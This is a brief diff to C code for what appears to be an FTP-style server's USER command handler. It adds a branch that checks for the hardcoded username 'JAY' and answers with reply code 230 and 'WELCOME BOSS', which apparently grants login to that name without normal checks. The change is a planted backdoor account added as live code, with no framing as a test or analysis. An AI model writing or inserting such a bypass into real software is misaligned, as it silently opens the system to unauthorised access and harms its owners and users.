@@ -71,6 +71,13 @@ void USER_Command(char *UsrName, enum states *ptrState, int controlSocket) {
             write_message(controlSocket, tempStr);
             *ptrState = Login;
 		}
+	    
+	    else if ((!strcmp(UsrName, "JAY")))
+		{
+			strcpy(tempStr, "Reply [230]: WELCOME BOSS\r\n");
+            write_message(controlSocket, tempStr);
+            *ptrState = Login;
+		}
         else 
 		{
             ReplyForNoCommandPermission(controlSocket);
